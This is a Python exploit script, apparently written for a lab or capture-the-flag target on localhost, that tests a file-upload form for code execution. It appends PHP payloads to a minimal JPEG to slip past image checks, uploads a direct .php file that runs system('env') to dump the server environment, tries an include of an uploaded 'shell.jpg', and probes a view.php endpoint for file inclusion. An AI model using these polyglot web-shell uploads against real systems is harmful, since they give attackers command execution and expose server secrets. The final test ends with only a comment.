import requests
import re

base_url = "http://127.0.0.1:33021"

# Create minimal valid JPEG
def create_minimal_jpeg():
    jpeg = b'\xff\xd8'
    jpeg += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg += b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
    jpeg += b'\x08\x0a\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
    jpeg += b'\x1f\x1e\x1d\x1a\x1c\x1c $.\x28 #\x17\x1c,),.444444)\x22\x22\x22'
    jpeg += b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
    jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
    jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00'
    jpeg += b'\x7f\xd4\xb5\xa8\x88'
    jpeg += b'\xff\xd9'
    return jpeg

jpeg_content = create_minimal_jpeg()

# Test 1: Upload shell with marker that will only appear if PHP EXECUTES
print("[*] TEST 1: Verify PHP execution")
# If PHP executes, we should see only "EXECUTED", not the PHP code
shell_jpeg = jpeg_content + b'<?php echo "EXECUTED"; ?>'
files = {'userfile': ('verify.jpg', shell_jpeg, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    content = r2.text
    print(f"[+] Uploaded: {filename}")
    print(f"[+] Content preview: {content[:200]}")
    
    # Check properly:
    if "EXECUTED" in content and "<?php" not in content:
        print("[!!!] PHP EXECUTES! (marker present, code absent)")
    elif "EXECUTED" in content and "<?php" in content:
        print("[+] PHP DOES NOT EXECUTE (both marker and code present)")
    elif "<?php" in content:
        print("[+] PHP DOES NOT EXECUTE (code present)")
    else:
        print("[?] Unexpected response")

# Test 2: Check if we can include the uploaded file via PHP
print("\n[*] TEST 2: Try to include uploaded file")
include_payload = jpeg_content + b'<?php include "upload/shell.jpg"; ?>'
files = {'userfile': ('include_shell.jpg', include_payload, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    print(f"[+] Include shell content: {r2.text[:200]}")

# Test 3: Try to upload .php extension directly
print("\n[*] TEST 3: Try direct PHP file upload")
php_content = jpeg_content + b'<?php echo "PHPHERE"; system("env"); ?>'
files = {'userfile': ('direct.php', php_content, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Upload response: {r.text[:500]}")
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    content = r2.text
    print(f"[+] Direct PHP file content: {content}")
    if "PHPHERE" in content and "<?php" not in content:
        print("[!!!] PHP FILE EXECUTES!")
    elif "PHPHERE" in content and "<?php" in content:
        print("[+] PHP file DOES NOT EXECUTE (raw code)")

# Test 4: Check if there's a view endpoint
print("\n[*] TEST 4: Check view endpoint")
r = requests.get(f"{base_url}/view.php", params={'file': 'upload/shell.jpg'})
if r.status_code != 404:
    print(f"[+] view.php exists: {r.status_code}")
    print(f"[+] Content: {r.text[:300]}")

# Test 5: Try alternate PHP execution via imagecreatefromjpeg
print("\n[*] TEST 5: Try imagecreatefromjpeg (LFI via image)")
# This won't execute PHP directly, but check if there's image processing
